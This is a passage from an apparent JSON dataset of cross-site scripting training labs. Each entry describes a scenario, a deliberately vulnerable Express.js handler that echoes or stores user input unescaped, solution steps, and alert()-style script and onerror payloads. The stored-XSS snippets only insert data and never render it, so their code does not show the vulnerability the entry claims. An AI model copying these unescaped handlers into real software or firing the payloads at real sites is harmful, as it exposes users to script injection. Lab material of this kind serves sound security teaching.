    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>RSVP received for ${name}</h3>`);\n});",
    "payloads": [
      "<script>alert('RSVPXSS')</script>",
      "<svg/onload=alert('RSVPXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in car rental system customer comments",
    "Lab Description": "Customers can leave comments about rentals. The input is stored without sanitization, allowing XSS attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment <script>alert('CarRental')</script>.",
      "Check rental details page and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO rental_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('CarRental')</script>",
      "<img src=x onerror=alert('RentalXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in file upload metadata field",
    "Lab Description": "The file uploader accepts a description field that is reflected without escaping, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload file with description: <script>alert('UploadXSS')</script>.",
      "Observe script execution in upload confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-file', (req, res) => {\n  const description = req.body.description;\n  res.send(`<p>File description: ${description}</p>`);\n});",
    "payloads": [
      "<script>alert('UploadXSS')</script>",
      "<svg/onload=alert('UploadXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in real estate portal property notes",
    "Lab Description": "Real estate users can add private notes to property listings. These notes are stored without sanitization, allowing persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add a private note: <script>alert('RealEstateXSS')</script>.",
      "View the property dashboard and trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-property-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO property_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('RealEstateXSS')</script>",
      "<img src=x onerror=alert('PropertyNote')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset form",
    "Lab Description": "The password reset form reflects the email input without sanitization, enabling reflected XSS attacks.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit email: <script>alert('ResetXSS')</script>.",
      "Observe execution on password reset confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to: ${email}</p>`);\n});",
    "payloads": [
      "<script>alert('ResetXSS')</script>",
      "<svg/onload=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in project collaboration tool task updates",
    "Lab Description": "Users can post updates to shared tasks, but the input is stored without validation, causing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a task update with <script>alert('TaskUpdate')</script>.",
      "View the project board and trigger the script."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-task', (req, res) => {\n  const update = req.body.update;\n  db.query(\"INSERT INTO task_updates (update_text) VALUES (?)\", [update]);\n  res.send('Task update posted');\n});",
    "payloads": [
      "<script>alert('TaskUpdate')</script>",
      "<img src=x onerror=alert('TaskXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in discount coupon generator",
    "Lab Description": "The discount code generation page reflects input data without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter coupon name: <script>alert('CouponXSS')</script>.",
      "Observe payload execution in the generated coupon page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-coupon', (req, res) => {\n  const coupon = req.body.coupon;\n  res.send(`<div>Your Coupon: ${coupon}</div>`);\n});",
    "payloads": [
      "<script>alert('CouponXSS')</script>",
      "<svg/onload=alert('Coupon')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in book review platform",
    "Lab Description": "Readers submit reviews for books without input sanitization, allowing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a book review: <script>alert('BookReviewXSS')</script>.",
      "Reload the book page and trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-book-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (content) VALUES (?)\", [review]);\n  res.send('Review posted');\n});",
    "payloads": [
      "<script>alert('BookReviewXSS')</script>",
      "<img src=x onerror=alert('BookXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in subscription confirmation page",
    "Lab Description": "The subscription form reflects the user's email on the confirmation page without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter email: <script>alert('SubXSS')</script>.",
      "Observe script execution after subscription confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h3>Thank you for subscribing, ${email}</h3>`);\n});",
    "payloads": [
      "<script>alert('SubXSS')</script>",
      "<svg/onload=alert('Subscribe')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internal ticket system ticket notes",
    "Lab Description": "Technicians can add notes to tickets. Notes are stored without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add ticket note: <script>alert('TicketNote')</script>.",
      "View the ticket details page and trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO ticket_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('TicketNote')</script>",
      "<img src=x onerror=alert('TicketXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in document sharing form",
    "Lab Description": "Document sharing confirmation page reflects input fields without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Share document with custom message: <script>alert('DocShare')</script>.",
      "Confirm payload triggers on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/share-document', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>Shared with message: ${message}</div>`);\n});",
    "payloads": [
      "<script>alert('DocShare')</script>",
      "<svg/onload=alert('DocShare')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in music streaming app playlist comments",
    "Lab Description": "Users can comment on playlists. Comments are stored without escaping, allowing persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Comment on a playlist: <script>alert('Playlist')</script>.",
      "View the playlist to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-playlist-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO playlist_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('Playlist')</script>",
      "<img src=x onerror=alert('PlaylistXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online recipe submission form",
    "Lab Description": "The recipe submission confirmation page reflects recipe names without encoding, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a recipe name: <script>alert('RecipeXSS')</script>.",
      "Observe script execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const recipeName = req.body.name;\n  res.send(`<div>Recipe submitted: ${recipeName}</div>`);\n});",
    "payloads": [
      "<script>alert('RecipeXSS')</script>",
      "<svg/onload=alert('RecipeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in team collaboration chat",
    "Lab Description": "Team members can post chat messages, but the application renders messages without sanitization, leading to persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post message: <script>alert('ChatXSS')</script>.",
      "Reload chat room and observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO chat_messages (content) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('ChatXSS')</script>",
      "<img src=x onerror=alert('Chat')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in invoice creation tool",
    "Lab Description": "The invoice generation form reflects customer names without sanitization in the final invoice view, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit customer name: <script>alert('Invoice')</script>.",
      "Trigger script execution in the invoice preview."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-invoice', (req, res) => {\n  const customer = req.body.customer;\n  res.send(`<h2>Invoice for: ${customer}</h2>`);\n});",
    "payloads": [
      "<script>alert('Invoice')</script>",
      "<svg/onload=alert('Invoice')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracker ticket comments",
    "Lab Description": "Users can comment on tickets without any output escaping, allowing stored XSS payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post ticket comment: <script>alert('BugXSS')</script>.",
      "Observe payload execution when viewing the ticket."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('BugXSS')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online quiz result page",
    "Lab Description": "After submitting an online quiz, the result page reflects the user's name without sanitization, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('Quiz')</script>.",
      "Observe execution in quiz results."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-quiz', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Quiz Completed by: ${name}</div>`);\n});",
    "payloads": [
      "<script>alert('Quiz')</script>",
      "<svg/onload=alert('Quiz')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in employee management notes",
    "Lab Description": "Employee management system allows adding notes to profiles without sanitization, causing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add note: <script>alert('Employee')</script> to a profile.",
      "View the employee profile to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-employee-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO employee_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('Employee')</script>",
      "<img src=x onerror=alert('EmployeeNote')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in contact us form confirmation",
    "Lab Description": "The 'Contact Us' form reflects the submitted message directly without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit message: <script>alert('ContactXSS')</script>.",
      "Trigger the script on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const message = req.body.message;\n  res.send(`<p>Your message: ${message}</p>`);\n});",
    "payloads": [
      "<script>alert('ContactXSS')</script>",
      "<svg/onload=alert('Contact')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in course review system",
    "Lab Description": "Students can post course reviews that are rendered without escaping, causing persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a course review: <script>alert('CourseXSS')</script>.",
      "View the course page to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO course_reviews (review) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('CourseXSS')</script>",
      "<img src=x onerror=alert('Course')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter subscription form",
    "Lab Description": "User input is reflected in the newsletter subscription confirmation page without escaping, causing XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Subscribe with email: <script>alert('Newsletter')</script>.",
      "Observe script execution after subscription."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h2>Welcome ${email}!</h2>`);\n});",
    "payloads": [
      "<script>alert('Newsletter')</script>",
      "<svg/onload=alert('Newsletter')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel booking special requests",
    "Lab Description": "Travel booking site allows special requests input without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add special request: <script>alert('Booking')</script>.",
      "Trigger script when viewing booking summary."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-special-request', (req, res) => {\n  const request = req.body.request;\n  db.query(\"INSERT INTO special_requests (request) VALUES (?)\", [request]);\n  res.send('Request saved');\n});",
    "payloads": [
      "<script>alert('Booking')</script>",
      "<img src=x onerror=alert('Travel')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in blog comment reply form",
    "Lab Description": "Blog reply form reflects user input without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Reply to a comment with: <script>alert('Reply')</script>.",
      "Observe execution when reply page loads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reply-comment', (req, res) => {\n  const reply = req.body.reply;\n  res.send(`<p>Reply: ${reply}</p>`);\n});",
    "payloads": [
      "<script>alert('Reply')</script>",
      "<svg/onload=alert('Reply')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online auction item description",
    "Lab Description": "Users can list auction items with custom descriptions. The application stores and renders them without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "List an item with description: <script>alert('AuctionXSS')</script>.",
      "Reload auction page and observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-auction', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO auctions (description) VALUES (?)\", [description]);\n  res.send('Auction created');\n});",
    "payloads": [
      "<script>alert('AuctionXSS')</script>",
      "<img src=x onerror=alert('Auction')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in customer order tracking page",
    "Lab Description": "The order tracking page reflects the provided order ID without sanitization, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Track order with ID: <script>alert('Order')</script>.",
      "Observe script execution in tracking page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/track-order', (req, res) => {\n  const orderId = req.body.orderId;\n  res.send(`<div>Tracking Order: ${orderId}</div>`);\n});",
    "payloads": [
      "<script>alert('Order')</script>",
      "<svg/onload=alert('Order')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in real estate listing notes",
    "Lab Description": "Agents can add notes to real estate listings. The notes are displayed without sanitization, leading to persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add listing note: <script>alert('RealEstate')</script>.",
      "View listing to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-listing-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO listing_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('RealEstate')</script>",
      "<img src=x onerror=alert('Listing')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online appointment confirmation",
    "Lab Description": "Appointment booking system reflects customer name without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book appointment with name: <script>alert('Appointment')</script>.",
      "Observe payload execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-appointment', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Appointment confirmed for: ${name}</p>`);\n});",
    "payloads": [
      "<script>alert('Appointment')</script>",
      "<svg/onload=alert('Appointment')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in gym membership feedback",
    "Lab Description": "Members can submit feedback about facilities, which is displayed without escaping, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback: <script>alert('GymFeedback')</script>.",
      "Reload feedback section and observe XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (text) VALUES (?)\", [feedback]);\n  res.send('Feedback received');\n});",
    "payloads": [
      "<script>alert('GymFeedback')</script>",
      "<img src=x onerror=alert('Gym')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in job application form",
    "Lab Description": "Job application form reflects applicant name back without proper escaping, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit application with name: <script>alert('Applicant')</script>.",
      "Observe execution on acknowledgment page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-application', (req, res) => {\n  const applicant = req.body.applicant;\n  res.send(`<div>Application received from: ${applicant}</div>`);\n});",
    "payloads": [
      "<script>alert('Applicant')</script>",
      "<svg/onload=alert('Applicant')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in ticket booking comments",
    "Lab Description": "Ticket booking site allows comments for each booking, stored without escaping, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add comment: <script>alert('TicketComment')</script>.",
      "Trigger script on ticket detail page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO ticket_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('TicketComment')</script>",
      "<img src=x onerror=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in feedback review page",
    "Lab Description": "Reviewing feedback entries reflects user input directly without sanitization, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback containing: <script>alert('FeedbackReview')</script>.",
      "Observe execution when feedback page loads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/review-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<h2>Feedback: ${feedback}</h2>`);\n});",
    "payloads": [
      "<script>alert('FeedbackReview')</script>",
      "<svg/onload=alert('Review')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in community forum new post",
    "Lab Description": "Users can create new forum posts, but content is stored without escaping, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create post with content: <script>alert('ForumPost')</script>.",
      "Reload forum thread to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/new-post', (req, res) => {\n  const post = req.body.post;\n  db.query(\"INSERT INTO forum_posts (content) VALUES (?)\", [post]);\n  res.send('Post published');\n});",
    "payloads": [
      "<script>alert('ForumPost')</script>",
      "<img src=x onerror=alert('Post')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online ticket support form",
    "Lab Description": "Support ticket form reflects ticket titles directly without sanitization, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit ticket title: <script>alert('SupportTicket')</script>.",
      "Observe execution on support page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>Ticket Submitted: ${title}</div>`);\n});",
    "payloads": [
      "<script>alert('SupportTicket')</script>",
      "<svg/onload=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online course platform announcement",
    "Lab Description": "Course instructors can post announcements. The announcement body is stored without sanitization, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post an announcement with: <script>alert('CourseXSS')</script>.",
      "Reload the course page and observe XSS execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  db.query(\"INSERT INTO announcements (text) VALUES (?)\", [announcement]);\n  res.send('Announcement posted');\n});",
    "payloads": [
      "<script>alert('CourseXSS')</script>",
      "<img src=x onerror=alert('Course')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset hint",
    "Lab Description": "Password reset form reflects user-provided security hint without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a hint: <script>alert('ResetXSS')</script>.",
      "Observe execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-hint', (req, res) => {\n  const hint = req.body.hint;\n  res.send(`<div>Your security hint: ${hint}</div>`);\n});",
    "payloads": [
      "<script>alert('ResetXSS')</script>",
      "<svg/onload=alert('Hint')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in product return reason form",
    "Lab Description": "Customers submit reasons for returning products. Inputs are stored without sanitization, allowing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reason: <script>alert('ReturnXSS')</script>.",
      "Trigger XSS by visiting return detail page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-return', (req, res) => {\n  const reason = req.body.reason;\n  db.query(\"INSERT INTO returns (reason) VALUES (?)\", [reason]);\n  res.send('Return submitted');\n});",
    "payloads": [
      "<script>alert('ReturnXSS')</script>",
      "<img src=x onerror=alert('Return')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter subscription confirmation",
    "Lab Description": "Newsletter subscription confirmation page reflects the subscriber's email without escaping, leading to XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Subscribe with email: <script>alert('NewsletterXSS')</script>.",
      "Observe payload execution after subscription."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Subscribed with: ${email}</p>`);\n});",
    "payloads": [
      "<script>alert('NewsletterXSS')</script>",
      "<svg/onload=alert('Newsletter')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internal HR feedback form",
    "Lab Description": "Employees submit internal feedback that is stored without validation, leading to stored XSS on HR portal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback: <script>alert('HRFeedback')</script>.",
      "View HR feedback dashboard to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-hr-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO hr_feedback (feedback) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
    "payloads": [
      "<script>alert('HRFeedback')</script>",
      "<img src=x onerror=alert('HR')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online donation thank-you message",
    "Lab Description": "Donation thank-you page reflects donor name without sanitization, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Donate with name: <script>alert('Donation')</script>.",
      "Observe execution in thank-you message."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/donate', (req, res) => {\n  const donor = req.body.donor;\n  res.send(`<h2>Thank you, ${donor}!</h2>`);\n});",
    "payloads": [
      "<script>alert('Donation')</script>",
      "<svg/onload=alert('Donate')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in CRM contact notes",
    "Lab Description": "CRM system stores client notes without sanitization, leading to persistent XSS when sales reps view notes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add contact note: <script>alert('CRM')</script>.",
      "View contact to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-contact-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO contact_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('CRM')</script>",
      "<img src=x onerror=alert('CRMContact')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in complaint submission system",
    "Lab Description": "Customer complaints are echoed back without escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit complaint text: <script>alert('Complaint')</script>.",
      "Observe script execution after submission."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-complaint', (req, res) => {\n  const complaint = req.body.complaint;\n  res.send(`<div>Your complaint: ${complaint}</div>`);\n});",
    "payloads": [
      "<script>alert('Complaint')</script>",
      "<svg/onload=alert('Complaint')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in company knowledge base article comments",
    "Lab Description": "Users can comment on internal knowledge base articles. Comments are stored and rendered without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment: <script>alert('KnowledgeBase')</script>.",
